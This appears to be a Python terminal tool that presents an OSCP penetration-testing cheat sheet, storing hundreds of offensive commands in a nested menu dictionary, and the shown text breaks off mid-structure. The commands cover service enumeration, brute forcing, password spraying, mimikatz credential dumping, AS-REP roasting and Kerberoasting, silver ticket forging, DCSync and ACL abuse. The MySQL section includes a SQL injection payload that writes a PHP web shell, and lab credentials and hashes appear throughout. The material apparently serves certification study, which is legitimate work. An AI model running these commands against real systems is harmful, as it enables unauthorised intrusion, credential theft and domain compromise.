import os
import sys
import readline
import pyperclip
from termcolor import colored

#
# 1) Path Colors
#
path_colors = ["cyan", "yellow", "magenta", "green", "blue", "white"]

def get_colored_path(path_stack, include_base=True):
    """
    Returns a single string with each segment in a different color.
    If include_base=True, prepends "OSCP Cheat Sheet" to the path.
    """
    segments = path_stack
    if include_base:
        segments = ["OSCP Cheat Sheet"] + path_stack
    
    colored_segments = []
    for i, segment in enumerate(segments):
        color = path_colors[i % len(path_colors)]
        colored_segments.append(colored(segment, color, attrs=["bold"]))
    
    return " / ".join(colored_segments)

#
# 2) Cheat Sheet Structure
#    Example: demonstrate headings in "SMB (139/445)" -> "Enumeration and Vulnerability check"
#
menu_structure = {
    "Ports Enumeration and Scanning": {
        "FTP (21)": [
            ("ftp $IP", "Checking if FTP is reachable"),
            ("anonymous / anonymous", "Default credentials"),
            ("system", "If login is successful, what system is running"),
            ("put FILENAME_FROM_MY_CURRENT_DIR.ext", "Can I upload a file?"),
            ("get FILENAME.ext", "Can I download files?"),
            ("sudo nmap -n -Pn -sU -oN tftp.txt -p 69 -sV --script tftp-enum $IP", "If it's TFTP, can nmap find anything interesting?"),
            ("hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp", "Brute forcing")
        ],
        "SMTP (25)": [
            ("nmap $IP --script=smtp* -p 25", "Nmap SMTP enumeration"),
            ("sudo perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP", "Enumerate SMTP users using smtp-user-enum.pl"),
            ("smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt -t postfish.off", "Using smtp-user-enum to find valid users"),
            ("sendemail -f 'maildmz@relia.com' -t 'jim@relia.com' -s 192.168.239.189:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a ~/webdav/config.Library-ms", "Sending email"),

        ],
        "DNS (53)": [
            ("dig @$IP axfr vault.offsec", "Attempt a DNS zone transfer for subdomain 'vault.offsec'"),
            ("dig @$IP axfr internal", "Attempt a DNS zone transfer for subdomain 'internal'"),
            ("(Reference) https://medium.com/@verylazytech/dns-port-53-pentesting-7b6a6307d54", "Useful DNS pentesting blog post"),
        ],
        "Kerberos (88)": [
            ("nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=hard-security.com $IP", "Discovers valid usernames by brute force querying"),
            ("kerbrute userenum -d hokkaido-aerospace.com --dc $IP /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt", "Kerbrute brute-forcing for valid user accounts"),
            ("./kerbrute_linux_amd64 userenum --dc 192.168.253.36 -d nara-security.com users.txt", "Confirming existence of users with kerbrute"),
        ],
        "POP3 (110)": [
            ("nc $IP 110", "Connect to POP3 service via netcat"),
            ("USER <USER>", "Provide username to log in"),
            ("PASS <pass>", "Provide password to log in"),
            ("list", "Retrieve list of emails on the server"),
            ("retr 1", "Read the first email"),
        ],
        "Microsoft Windows RPC (135)": [
            ("rpcclient -U '' -N $IP", "Connect to RPC (no user, no password)"),
            ("rpcclient -U '' -N $IP -c 'querydispinfo'", "Enumerate AD users from a resource domain"),
            ("rpcclient -U '' -N $IP -c 'enumdomusers'", "List domain users"),
            ("<tab><tab>", "After connecting, double-tab to see other commands"),
        ],
        "IMAP (143)": [
            ("nc $IP 143", "Connect to IMAP service via netcat"),
            ("tag login jonas@localhost SicMundusCreatusEst", "Log in with valid IMAP credentials"),
            ("tag LIST \"\" \"*\"", "List available mailboxes (e.g., INBOX)"),
            ("tag SELECT INBOX", "Select the INBOX mailbox"),
            ("tag STATUS INBOX (MESSAGES)", "Check status and number of messages"),
            ("tag fetch 1 BODY[1]", "Retrieve the body of the first email"),
            ("tag fetch 2:5 BODY[HEADER] BODY[1]", "Retrieve header and body of messages 2 through 5"),
        ],
        "SMB (139/445)": {
            "Enumeration and Vulnerability check": [
                {
                    "Vulnerability Check - Nmap": [
                        ("sudo nmap -sCVS --script=smb-vuln-* -vvv $IP", "Nmap - check SMB vulnerabilities"),
                    ]
                },
                {
                    "Share enumeration - Nmap": [
                        ("nmap --script smb-enum-shares -p 139,445 $IP", "Nmap - enumerates SMB shares")
                    ]
                },
                {
                    "Enumerating Hostname": [
                        ("nmblookup -A $IP", "Nmblookup"),
                        ("enum4linux -a $IP", "Enum4linux"),
                        ("crackmapexec smb 192.168.133.0/24", "Basic enumeration"),
                        ("crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt", "Getting all Hosts with SMB Signing Disabled"),
                        ("netexec smb $IP -u '' -p '' --shares", "Netexec with no credentials"),
                        (
                            "nxc smb 192.168.107.100-192.168.107.102 -u 'nate' -p 'barcelona' --groups --local-groups "
                            "--loggedon-users --rid-brute --sessions --users --shares --pass-pol",
                            "Netexec with credentials"
                        ),
                    ]
                },
                {
                    "Null sessions": [
                        ("smbmap -H $IP", "Smbmap"),
                        ("smbmap -H $VM1 -u guest -d ZEUS", "Smbmap (authenticated)"),
                        ("smbclient -L //$IP", "List shares with null session"),
                        ("rpcclient -U '' -N $IP", "RPC client"),
                        ("crackmapexec smb $IP -u '' -p '' --pass-pol", "Enumerating the Password Policy"),
                        ("crackmapexec smb $IP  -u '' -p '' --users --export $(pwd)/users.txt", "Enumerating Users"),
                        ("sed -i \"s/'/\\\"/g\" users.txt", "Extracting Users List"),
                        ("jq -r '.[]' users.txt > userslist.txt", "Extracting Users List"),
                        ("cat userslist.txt", "Extracting Users List"),
                    ]
                },
                {
                    "Connecting to SMB Shares": [
                        ("smbclient \\\\\\\\$IP\\\\[share name]", "Without creds"),
                        ("smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users", "With creds"),
                    ]
                },
                {
                    "SMB clinet - downloading all files": [
                        ("smbclient //10.10.10.100/Replication", "Connecting to host"),
                        ("prompt off", "smb: \\>"),
                        ("recurse on", "smb: \\>"),
                        ("mget *", "smb: \\>"),

                    ]
                }
            ],
            "Exploitation": [
                ("smbmap -H $IP -R", "List all files recursively in accessible shares"),
                ("crackmapexec smb $IP -u user -p pass --shares", "Check shares with credentials"),
                ("impacket-smbexec domain/user:pass@$IP", "Obtain shell via smbexec"),
            ],
            "Connecting to SMB Shares": [
                ("smbclient \\\\$IP\\[share name]", "Connect without credentials"),
                ("smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users", "Connect with credentials"),
            ],
            "Downloading All Files": [
                ("smbclient \\\\$IP\\ShareName -U user", "Connect to a share via smbclient"),
                ("prompt off", "Disable confirmation for each file"),
                ("recurse on", "Enable recursion for subdirectories"),
                ("mget *", "Download all files"),
            ],
        },
        "SNMP (161)": [
            {
                "Windows SNMP MIB values": [
                    ("1.3.6.1.2.1.25.1.6.0", "System Processes"),
                    ("1.3.6.1.2.1.25.4.2.1.2", "Running Programs"),
                    ("1.3.6.1.2.1.25.4.2.1.4", "Processes Path"),
                    ("1.3.6.1.2.1.25.2.3.1.4", "Storage Units"),
                    ("1.3.6.1.2.1.25.6.3.1.2", "Software Name"),
                    ("1.3.6.1.2.1.6.13.1.3", "TCP Local Ports")
                ]
            },
            {
                "Using nmap to perform a SNMP scan": [
                    ("sudo nmap -sU --open -p 161 192.168.50.254 -oG open-snmp.txt", "Nmap: SNMP scan (UDP/161)"),
                    ("sudo nmap -p161 -sC -sV --script=snmp* $TARGET", "Nmap: run SNMP scripts")
                ]
            },
            {
                "snmp-check": [
                    ("snmp-check $IP", "Quickly enumerate SNMP data")
                ]
            },
            {
                "onesixtyone": [
                    ("echo public > community", "Add 'public' to community file"),
                    ("echo private >> community", "Add 'private' to community file"),
                    ("echo manager >> community", "Add 'manager' to community file"),
                    ("for ip in $(seq 1 254); do echo 192.168.50.$ip; done >> ips", "Generate IP list (192.168.50.x)"),
                    ("onesixtyone -c community -i ips", "Brute force community strings with onesixtyone")
                ]
            },
            {
                "snmpwalk": [
                    ("snmpwalk -v2c -c public $IP", "Walk the SNMP MIB tree using 'public' community")
                ]
            },
            {
                "Machines where SNMP was enumerated": [
                    ("ClamAV", "PG")
                ]
            }
        ],
        "LDAP (389)": [
            {
                "ldapsearch": [
                    (
                        'ldapsearch -x -v -b "DC=htb,DC=offsec" -H "ldap://192.168.76.122" "(objectclass=*)"',
                        "Basic ldapsearch with base DN and objectClass filter"
                    ),
                    (
                        "ldapsearch -x -H ldap://$IP -b DC=htb,DC=offsec",
                        "Enumerate LDAP with ldapsearch (simple bind, no creds)"
                    )
                ]
            },
            {
                "windapsearch": [
                    (
                        "windapsearch -d htb.local -U -dc-ip 10.10.10.161",
                        "Windapsearch enumeration (domain, user listing, etc.)"
                    )
                ]
            },
            {
                "nmap": [
                    (
                        'nmap --script "ldap*" and not brute $IP -p 389 -v -Pn -sT',
                        "Nmap: enumerate LDAP using scripts (excluding brute forcing)"
                    )
                ]
            }
        ],
        "MySQL (3306)": [
            {
                "Nmap Enumeration": [
                    (
                        "nmap -p 3306 -sV --script mysql* $IP",
                        "Run MySQL-specific Nmap scripts for version detection and enumeration"
                    ),
                    (
                        "nmap -p 3306 -A $IP",
                        "Aggressive scan (OS detect, version, script scanning, traceroute)"
                    )
                ]
            },
            {
                "MariaDB Enumeration": [
                    ("show databases;", "List all databases"),
                    ("use <database>;", "Switch to a particular database"),
                    ("show tables;", "List tables in the current database"),
                    ("show columns from <table>;", "List columns in a table"),
                    ("select * from <table>;", "Dump all rows from a table")
                ]
            },
            {
                "Connecting to MySQL": [
                    ("mysql -u root -p -h $IP", "Connect as root user (if password known/empty)"),
                    ("mysqldump -u root -p -h $IP <database> > dump.sql", "Dump an entire database to a file")
                ]
            },
            {
                "Connecting to MS SQL using impacket": [
                    (
                        "impacket-mssqlclient hokkaido-aerospace.com/discovery:'Start123!'@192.168.240.48 -p 1433 -windows-auth",
                        "Connect to MS SQL with domain credentials (impacket)"
                    )
                ]
            },
            {
                "Basic Enumeration (based on Hokkaido box)": [
                    (
                        "SELECT name FROM master.sysdatabases;",
                        "Check available databases"
                    ),
                    (
                        "use hrappdb;",
                        "Switch to the 'hrappdb' database"
                    ),
                    (
                        "SELECT DISTINCT name "
                        "FROM sys.server_principals a "
                        "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
                        "WHERE a.permission_name = 'IMP';",
                        "Identify principals you can impersonate"
                    ),
                    (
                        "EXECUTE AS LOGIN = 'hrappdb-reader';",
                        "Impersonate (login as) another user"
                    ),
                    (
                        "SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;",
                        "List all tables in 'hrappdb'"
                    )
                ]
            },

            {
                "PrivEsc": [
                    ("https://www.exploit-db.com/exploits/1518", "When MySQL is running as root - Load a malicious library (UDF) to escalate privileges (Pebbles box)"),
                    (
                        """UNION SELECT "<?php echo passthru($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\cmd.php" --""",
                        "Write a malicious PHP shell to webroot (Medjed box)"
                    )
                ]
            },
            {
            }
        ],
        "Steganography": [
            ("steghide --extract -sf <file_name>", "Steghide"),
            ("exiftool", "Exiftool"),
        ],
    },
    "AD": {
        "Enumeration": 
            {
            "Manual enumeration": 
                {
                "PowerView": 
                    {
                    "Basic commands":
                            [
                            ("Import-Module .\\PowerView.ps1","Importing PowerView to memory"),
                            ("Get-NetDomain","Obtaining domain information"),
                            ("Get-NetUser","Querying users in the domain"),
                            ("Get-NetUser | select cn","Querying users using select statement"),       
                            ("Get-NetGroup | select cn","Querying groups in the domain using PowerView"), 
                            ("Get-NetGroup \"Sales Department\" | select member","Enumerating the \"Sales Department\" group"), 
                            ("Get-NetComputer","Enumerating Operating Systems"),
                            ("Get-NetComputer | select operatingsystem,dnshostname","OS and Hostname"),
                            ("Get-NetUser","Querying users in the domain"),
                            ("Get-NetUser","Querying users in the domain"),
                            ],
                    "Permissions and Logged on Users": 
                            [
                            ("Find-LocalAdminAccess","Scanning domain to find local administrative privileges for our user"),
                            ("Get-NetSession -ComputerName files04","Checking logged on users with Get-NetSession"),
                            ("Get-Acl -Path HKLM:SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\ | fl","Displaying permissions on the DefaultSecurity registry hive"),
                            ("Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion","Querying operating system and version"),
                            (".\\PsLoggedon.exe \\files04","Using PsLoggedOn to see user logons at Files04"),
                            ("Get-ADPrincipalGroupMembership -Identity TRACY.WHITE","To which group belongs user (from nara box)"),
                            ],
                    "Enumeration Through Service Principal Names": 
                            [
                            ("setspn -L iis_service","Listing SPN linked to a certain user account"),
                            ("Get-NetUser -SPN | select samaccountname,serviceprincipalname","Listing the SPN accounts in the domain"),
                            ("nslookup.exe web04.corp.com","Resolving the web04.corp.com name"),
                            ],
                    "Enumerating Object Permissions": 
                            [
                            ("Get-ObjectAcl -Identity stephanie","Running Get-ObjectAcl specifying our user"),
                            ("Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104","Converting the ObjectISD into name"),
                            ("Get-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights","Enumerating ACLs for the Management Group"),
                            ("\"S-1-5-21-1987370270-658905905-1781884369-512\",\"S-1-5-21-1987370270-658905905-1781884369-1104\",\"S-1-5-32-548\",\"S-1-5-18\",\"S-1-5-21-1987370270-658905905-1781884369-519\" | Convert-SidToName","Converting all SIDs that have GenericAll permission on the Management Group"),
                            ("net group \"Management Department\" stephanie /add /domain","Using \"net.exe\" to add ourselves to domain group"),
                            ("Get-NetGroup \"Management Department\" | select member","Running \"Get-NetGroup\" to enumerate \"Management Department\""),
                            ],
                    "Enumerating Domain Shares": 
                            [
                            ("Find-DomainShare","Domain Share Query"),
                            ("ls \\\\dc1.corp.com\\sysvol\\corp.com\\ ","Listing contents of the SYSVOL share"),
                            ("cat \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\oldpolicy\\old-policy-backup.xml","Checking contents of old-policy-backup.xml file"),
                            ("gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"","Using gpp-decrypt to decrypt the password"),
                            ("ls \\\\FILES04\\docshare","Listing the contents of docsare"),
                            ("ls \\\\FILES04\\docshare\\docs\\do-not-share","Listing the contents of do-not-share"),
                            ],
                    },
                
                },
            "Initial enumeration":
            [
                { 
                "Identifying Users":
                    [
                    ("kerbrute userenum -d CORP.LOCAL --dc 192.168.1.5 /usr/share/wordlists/jsmith2.txt -o valid_ad_users","Enumerating Users with Kerbrute"),
                    ],
                },
                { 
                "Responder":
                    [
                    ("sudo responder -I ens224 ","Starting responder"),
                    ("hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt ","Cracking responder's hash"),
                    ],
                },
            ],
            "Credentialed enumeration - from Linux":
            [ 
                {
                "Crackmapexec":
                    [
                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 --users","Domain users enumeration"),
                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 --groups","Domain groups enumeration"),
                    ("sudo crackmapexec smb 172.16.5.130 -u forend -p Pass123 --loggedon-users","Logged on users"),
                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 --shares","Share enumeration"),
                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 -M spider_plus --share 'Department Shares'","Enumerating particular share"),
                    ],
                },
                {
                "SMBMap":
                    [
                    ("smbmap -u forend -p Pass123 -d CORP.LOCAL -H 192.168.1.5","Check access"),
                    ("smbmap -u forend -p Pass123 -d CORP.LOCAL -H 192.168.1.5 -R 'Department Shares' --dir-only","Recursive List Of All Directories"),
                    ],
                },
                {
                "Rpcclient":
                    [
                    ("rpcclient -U "" -N 192.168.1.5","SMB Null session"),
                    ("queryuser 0x457","RPCClient User Enumeration By RID"),
                    ("enumdomusers","RPCClient User Enumeration"),
                    ],
                },
                {
                "Impacket Toolkit":
                    [
                    ("psexec.py CORP.LOCAL/alice:'transporter@4'@192.168.1.125","Psexec - Connecting to a host with local admin creds"),
                    ("wmiexec.py CORP.LOCAL/alice:'transporter@4'@192.168.1.5","Wmiexec - Connecting to the host with local admin creds"),
                    ],
                },
                {
                "Windapsearch":
                    [
                    ("python3 windapsearch.py --dc-ip 192.168.1.5 -u forend@CORP.LOCAL -p Pass123 --da","Finding Domain Admins"),
                    ("python3 windapsearch.py --dc-ip 192.168.1.5 -u forend@CORP.LOCAL -p Pass123 -PU","Finding privileged users"),
                    ("enumdomusers","RPCClient User Enumeration"),
                    ],
                },
                {
                "Bloodhound":
                    [
                    ("Import-Module .\\Sharphound.ps1","Importing the SharpHound script to memory"),
                    ("Get-Help Invoke-BloodHound","Checking the SharpHound options"),
                    ("Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp audit\"","Running SharpHound to collect domain data"),
                    ("ls C:\\Users\\stephanie\\Desktop\\","SharpHound generated files"),
                    ],
                },
                {
                "Bloodhound - netexec":   
                    [    
                    ("netexec ldap $IP -u Alice.Green -p 'Pass123' --bloodhound --collection All --dns-server $IP","Using netexec to collect Bloodhound data"),
                    ],
                },
            ],
            "Credentialed enumeration - from Windows": 
            [
                {"ActiveDirectory PowerShell Module":
                    [
                    ("Get-Module","What modules are lodaded ?"),
                    ("Import-Module ActiveDirectory","Load ActiveDirectroy module"),
                    ("Get-ADDomain","Get domain info"),
                    ("Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName","Accounts that may be susceptible to a Kerberoasting attack"),
                    ("Get-ADTrust -Filter *","Checking For Trust Relationships"),
                    ("Get-ADGroup -Filter * | select name","AD group information"),
                    ("Get-ADGroup -Identity \"Backup Operators\"","Detailed Group Info"),
                    ("Get-ADGroupMember -Identity \"Backup Operators\"","Group Membership"),                 
                    ],

                },
                {"PowerView":
                    [
                    ("Get-DomainUser -Identity mmorgan -Domain CORP.LOCAL | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol","Domain User Information"),
                    ("Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse","Let's enumerate some domain group information"),
                    ("Get-DomainTrustMapping","Trust Enumeration"),
                    ("Test-AdminAccess -ComputerName ACADEMY-EA-MS01","Where our user which we're currently logged is admin"),
                    ("Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName","Accounts which may be subjected to a Kerberoasting attack"),
                    ],

                },
                {"SharpView":
                    [
                    (".\\SharpView.exe Get-DomainUser -Identity forend","Getting info about specific user"),
                    ],

                },
                {"Shares - Snaffler":
                    [
                    ("Snaffler.exe -s -d CORP.LOCAL -o snaffler.log -v data","Running Snaffler"),
                    (".\\Snaffler.exe  -d CORP.LOCAL -s -v data","Running Snuffler"),
                    ],
                },
                {"Bloodhound/Sharphound":
                    [
                    (" .\\SharpHound.exe -c All --zipfilename ILFREIGHT","Getting data for Bloodhound"),
                    ],
                },
            ],
            "Automatic enumeration": [
                {
                "Bloodhound":
                    [
                    ("Import-Module .\\Sharphound.ps1","Importing the SharpHound script to memory"),
                    ("Get-Help Invoke-BloodHound","Checking the SharpHound options"),
                    ("Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\alice\\Desktop\\ -OutputPrefix \"audit\"","Running SharpHound to collect domain data"),
                    ("ls C:\\Users\\alice\\Desktop\\","SharpHound generated files"),
                    ],
                },
                {
                "Bloodhound - netexec":   
                    [    
                    ("netexec ldap $IP -u Alice.Green -p 'Pass123' --bloodhound --collection All --dns-server $IP","Using netexec to collect Bloodhound data"),
                    ],
                },
                {
                "Running bloodhound":
                    [
                    ("sudo neo4j start","Starting neo4j"),
                    ("login neo4j:kali","Login to neo4j"),
                    ("bloodhound","Running bloodhound"),
                    ],
                },
        
            ],
        },
        "Attacks":     
            {
            "Password attacks": 
            [
                {
                    "Password spraying":
                        [
                        (".\\Spray-Passwords.ps1 -Pass Nexus123! -Admin","Using Spray-Passwords to attack user accounts"),
                        ("crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success","Using crackmapexec (which laverages SMB -pwn3d! when administrator privileges) (local kali machine)"),
                        (".\\kerbrute_windows_amd64.exe passwordspray -d corp.com .\\usernames.txt \"Nexus123!\"","Using kerbrute to attack user accounts"),                                                
                        ],
                },
                {
                    "Netexec":
                        [
                        ("nxc smb 192.168.1.0/24 -u Username -p 'Password'","Automatically picking up a domain"),
                        ("nxc smb 192.168.1.0/24 -u Username -p 'Password' --local-auth","Adding local auth designates a local account"),
                        ("nxc smb <target(s)> -u 'Username' -p 'Password' -M lsassy","Dumping sensitive information from the lsass process "),
                        ("nxc smb 192.168.1.0/24 -u Username -p 'Password' --sam","Pull SAM hashes"),
                        ("nxc smb 192.168.1.0/24 -u Username -p 'Password' --shares","Listing shares"),
       
                        ],
                },
                {
                    "Crackmapexec":
                        [
                        ("crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p Inlanefreight01!","Password Attack with a List of Usernames and a Single Password"),
                        ("crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!","Password Attack with a List of Usernames and Two Passwords"),
                        ("crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success","Continue on Success"),
                        ("crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt","Password Attack with a List of Usernames and a Password List"),
                        ("crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth","Testing local accounts instead of domain accounts"),
                        ("crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success","WinRM - Password Spraying"),
                        ("crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!","LDAP - Password Spraying (FQDN not IP)"),
                        ("crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb","MSSQL - Password Spray"),
                        ("crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .","MSSQL - Local Windows Account"),
                        ("crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth","SQL Account"),
                        ],
                },

            ],
            "Cached AD credentials": 
            [
                {
                    "Cached AD Credentials":
                        [
                        (".\\mimikatz.exe privilege::debug","Starting Mimikatz and enabling SeDebugPrivilege (on target machine)"),
                        ("sekurlsa::logonpasswords","Executing Mimikatz on a domain workstation"),
                        ("dir \\web04.corp.com\backup","Ticket from SMB: Opening SMB share on WEB04 (to cache service ticket)"),
                        ("sekurlsa::tickets","Ticket from SMB: Extracting Kerberos tickets with mimikatz"),
                        ("impacket-secretsdump oscp/emmet@10.10.1.202","Mimikatz remotely"),
                        ],
                },
            ],
            "AS-REProasting": 
            [
                {
                    "ASREPRoastable Accounts":
                        [
                        ("crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out","Bruteforcing Accounts for ASREPRoasts"),
                        ("crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out","Search for ASREPRoast Accounts"),
                        ("hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt","Password Cracking"),
                        ],
                },
                {
                    "AS-REP Roasting":
                        [
                        ("impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete","impacket"),
                        (".\\Rubeus.exe asreproast /nowrap","Rubeus - from Windows"),
                        ("hashcat --help | grep -i \"Kerberos\"","Cracking the obtained hash"),
                        ("sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Cracking the AS-REP hash with Hashcat"),
                        ],
                },
            ],
            "Kerberoasting": 
            [
                ("sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete","Impacket - From Linux"),
                (".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast","Rubeus - from Windows"),
                ("Access","Machines"),
            ],
            "Silver ticket": 
            [
                {"Mimikatz to obtain NTLM hash":
                    [
                    ("privilege::debug","Starting Mimikatz and enabling SeDebugPrivilege (on target machine)"),
                    ("",""),
                    ("",""),
                    ],
                },
                {"Obtaining the domain SID":
                    [
                    ("whoami /user","Getting SID"),
                    ("",""),
                    ("",""),
                    ],
                },
                {"Forging the service ticket":
                    [
                    ("kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin","Forging the service ticket with the user jeffadmin and injecting it into the current session. Mimikatz shell"),
                    ("klist","Checking the granted ticket"),
                    ("iwr -UseDefaultCredentials http://web04","Accessing the SMB share with the silver ticket"),
                    ],
                },
            ],
            "DCSync (Domain Controler Synchronization)": 
            [
                {"Impacket":
                    [
                    ("impacket-secretsdump -just-dc-user dave corp.com/","Impacket - From Linux"),
                    ],
                },
                {"Mimikatz":
                    [
                    ("lsadump::dcsync /user:corp\\dave","Mimikatz - example #1"),
                    ("lsadump::dcsync /user:corp\\Administrator","Mimikatz - example #1"),
                    ],
                },
                {"Cracking the hash":
                    [
                    ("hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Cracking the hash"),
                    ],
                },

            ],
            "ACL attacks": 
            {
                "Enumeration":
                    [   
                        { "Enumerating ACLs with PowerView":
                            [
                            ("Import-Module .\\PowerView.ps1","Importing PowerView"),
                            ("$sid = Convert-NameToSid alice","Focusing on user alice"),
                            ("Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}","Find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier"),
                            ("$guid= \"00299570-246d-11d0-a768-00aa006e0529\"","Check ObjectAceType to see what rights we have"),
                            ("Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl","Check ObjectAceType to see what rights we have"),
                            ("Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}","Human readable ObjectAceType"),
                            ("Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose","Further Enumeration of Rights Using damundsen"),
                            ],
                        },
                        { "Groups":
                            [
                                ("Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof","Investigating the Help Desk Level 1 Group with Get-DomainGroup"),
                                ("$itgroupsid = Convert-NameToSid \"Information Technology\"","Investigating the Information Technology Group"),
                                ("Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose","Investigating the Information Technology Group"),
                                ("$adunnsid = Convert-NameToSid adunn","Looking for Interesting Access"),
                                ("Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose","Looking for Interesting Access"),
                            ],
                        },
                    ],
                "ACL Abuse Tactics":
                    [   
                        { "Authenticate as alice and force change the password of the user damundsen":
                            [],
                        },
                        {
                        "Creating a PSCredential Object":
                            [
                                ("$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force","Creating a PSCredential Object"),
                                ("$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\alice', $SecPassword)","Creating a PSCredential Object - Example"),
                            ],
                        },
                        {
                        "Changing the User's Password":
                            [
                                ("Import-Module .\\PowerView.ps1","Importing PowerView"),
                                ("Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose","Changing damundsen's password"),
                            ],
                        },
                        {
                        "Adding damundsen to the Help Desk Level 1 Group":
                            [
                                ("Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members","Adding to the Help Desk group"),
                                ("Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName","Checking if was added to the group"),
                            ],
                        },
                        {
                        "Creating a Fake SPN":
                            [
                                ("Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose","Create fake SPN"),
                                (".\\Rubeus.exe kerberoast /user:adunn /nowrap","Kerberoasting with Rubeus"),
                            ],
                        },
                    ],
            },
            },
        "Lateral movement": 
            {
            "WinRM": 
            [   
                {
                "New-PSSession - from Windows machine": 
                    [
                    ("$username = 'alice';","New PSSession"),
                    ("$password = 'Nexus123!';;","New PSSession"),
                    ("$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;","New PSSession"),
                    ("New-PSSession -ComputerName 192.168.50.73 -Credential $credential;","Connecting to remote machine"),
                    ("Enter-PSSession 1","Invoking New-PSSession"),
                    ]
                },
                {
                "Evil WinRM": 
                    [
                        ("evil-winrm -i 192.168.50.220 -u admin -p \"bqwert123\\!\\!\"","Using evil-winrm"),
                        ("upload <local_file> <remote_file>","Uploading file (evil-winrm shell)"),
                        ("download <remote_file> [local_file]","Downloading file (evil-winrm shell)"),
                    ],
                },
            ],
            "PSexec": 
            [   
                {
                colored("Prerequisites: You need local admin privileges, an available ADMIN$ share, and File and Printer Sharing enabled.","white"):
                    [],
                },
                {
                "PsExec - from Windows machine": 
                    [
                        ("./PsExec64.exe -i  \\\\FILES05 -u corp\\ben -p Nex123! cmd","PsExec usage"),
                    ],
                },
            ],
            "Pass the hash":
            [   
                {
                colored("Requires NTLM authentication with an open SMB port (445) and enabled File and Printer Sharing (not working with Kerberos authentication).","white"):
                    [],
                },
                {
